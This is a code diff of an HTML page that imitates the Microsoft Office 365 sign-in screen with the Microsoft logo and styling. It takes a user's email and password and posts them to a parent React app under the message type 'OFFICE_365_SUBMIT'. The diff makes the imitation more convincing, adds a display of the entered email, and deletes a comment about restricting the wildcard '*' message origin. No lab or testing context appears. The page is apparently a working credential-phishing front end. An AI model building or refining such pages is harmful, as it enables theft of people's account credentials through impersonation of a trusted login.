@@ -5,30 +5,127 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body, html { height: 100%; margin: 0; font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif; background-color: #f2f2f2; display: flex; align-items: center; justify-content: center; }
-    .form-wrapper { max-width: 440px; width: 100%; background-color: #ffffff; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    .form-box { padding: 44px; }
-    .form-box img.logo { height: 23px; margin-bottom: 24px; }
-    .form-box h1 { font-size: 24px; font-weight: 600; margin-bottom: 24px; color: #1b1b1b; padding: 0; }
-    .form-box p { font-size: 13px; margin-top: 16px; margin-bottom: 0; }
-    .form-box a { color: #0067b8; text-decoration: none; }
-    .form-box a:hover { text-decoration: underline; }
-    .form-control { width: 100%; border: none; border-bottom: 1px solid #666; font-size: 16px; padding: 8px 0; }
-    .form-control:focus { outline: none; border-bottom: 2px solid #0067b8; margin-bottom: -1px; }
-    .button-container { text-align: right; margin-top: 32px; }
-    .btn-primary-blue { background-color: #0067b8; color: white; padding: 8px 32px; border: none; cursor: pointer; font-size: 15px; }
-    .btn-primary-blue:hover { background-color: #005a9e; }
-    .options-box { border-top: 1px solid #e5e5e5; padding: 24px 44px; cursor: pointer; }
-    .options-box:hover { background-color: #f9f9f9; }
-    .options-box a { color: #1b1b1b; text-decoration: none; display: flex; align-items: center; }
-    .hidden { display: none !important; }
-    #error-message { color: #B22222; background-color: #fdd; border: 1px solid #fbb; padding: 10px; margin-bottom: 20px; font-size: 14px; }
+    /* Base Styles */
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    /* Container for the cards */
+    .card-container {
+      width: 100%;
+      max-width: 440px;
+    }
+
+    /* Main Login Card */
+    .login-card {
+      background-color: #ffffff;
+      padding: 44px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+    }
+    
+    .login-card img.logo {
+      height: 23px;
+      margin-bottom: 24px;
+    }
+    
+    .login-card h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 28px 0;
+      color: #1b1b1b;
+    }
+    
+    .login-card p {
+      font-size: 13px;
+      margin-top: 24px;
+      margin-bottom: 0;
+    }
+    
+    .login-card a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+    
+    .login-card a:hover {
+      text-decoration: underline;
+    }
+
+    .form-control {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #666;
+      font-size: 15px;
+      padding: 8px 0;
+      margin-bottom: 8px; /* Space before links */
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-bottom: 2px solid #0067b8;
+      margin-bottom: 7px; /* Adjust to prevent layout shift */
+    }
+    
+    .button-container {
+      text-align: right;
+      margin-top: 32px;
+    }
+    
+    .btn-primary-blue {
+      background-color: #0067b8;
+      color: white;
+      padding: 8px 32px;
+      border: none;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    
+    .btn-primary-blue:hover {
+      background-color: #005a9e;
+    }
+
+    /* Sign-in Options Card */
+    .options-card {
+      background-color: #ffffff;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+      margin-top: 24px; /* Space between cards */
+      padding: 24px 44px;
+      cursor: pointer;
+    }
+
+    .options-card:hover {
+      background-color: #f9f9f9;
+    }
+
+    .options-card a {
+      color: #1b1b1b;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+    }
+
+    /* Utility and Logic Styles */
+    .hidden {
+      display: none !important;
+    }
+    
+    #error-message {
+      color: #a80000;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
   </style>
 </head>
 <body>
-  <div class="form-wrapper">
-    <div class="form-box">
-      <!-- Email View -->
+
+  <div class="card-container">
+    <!-- Main Login Card -->
+    <div class="login-card">
       <div id="email_view">
         <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" class="logo">
         <h1>Sign in</h1>
@@ -40,9 +137,9 @@
           <button class="btn-primary-blue" id="next_btn">Next</button>
         </div>
       </div>
-      <!-- Password View -->
       <div id="password_view" class="hidden">
         <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" class="logo">
+        <p id="user_email_display" style="margin-top: 0; margin-bottom: 16px;"></p>
         <h1>Enter password</h1>
         <div id="password_error_container"></div>
         <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
@@ -52,7 +149,9 @@
         </div>
       </div>
     </div>
-    <div class="options-box">
+    
+    <!-- Sign-in Options Card -->
+    <div class="options-card">
       <a href="#">
         <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options" style="width: 24px; height: 24px; margin-right: 12px;">
         <span>Sign-in options</span>
@@ -68,43 +167,44 @@
       const signinBtn = document.getElementById('signin_btn');
       const emailInput = document.getElementById('email');
       const passwordInput = document.getElementById('password');
-      const emailErrorContainer = document.getElementById('email_error_container');
       const passwordErrorContainer = document.getElementById('password_error_container');
+      const userEmailDisplay = document.getElementById('user_email_display');
       let userEmail = '';
 
-      // --- CRITICAL FIX: Listen for messages from the React Parent ---
+      // Listen for error messages from the parent React app
       window.addEventListener('message', function (event) {
         if (event.data.type === 'LOGIN_ERROR') {
           const errorMessage = event.data.payload.message;
-          // Display the error in the password view and clear the password field
           passwordErrorContainer.innerHTML = `<div id="error-message">${errorMessage}</div>`;
-          passwordInput.value = ''; // Clear password on error
+          passwordInput.value = '';
           passwordInput.focus();
         }
       });
 
+      // Show password view
       nextBtn.addEventListener('click', function () {
         if (emailInput.value.trim() !== '') {
           userEmail = emailInput.value.trim();
-          emailView.classList.add('hidden');
-          passwordView.classList.remove('hidden');
+          userEmailDisplay.textContent = userEmail;
+          emailView.style.display = 'none';
+          passwordView.style.display = 'block';
           passwordInput.focus();
         }
       });
 
+      // Send credentials to parent React app
       signinBtn.addEventListener('click', function () {
         const password = passwordInput.value.trim();
-        // Clear any previous errors before a new submission
         passwordErrorContainer.innerHTML = '';
         if (password !== '') {
-          // Send credentials up to the parent React app
           window.parent.postMessage({
             type: 'OFFICE_365_SUBMIT',
             payload: { email: userEmail, password: password }
-          }, '*'); // In a real app, you'd restrict this to your domain for security
+          }, '*');
         }
       });
     });
   </script>
+
 </body>
 </html>
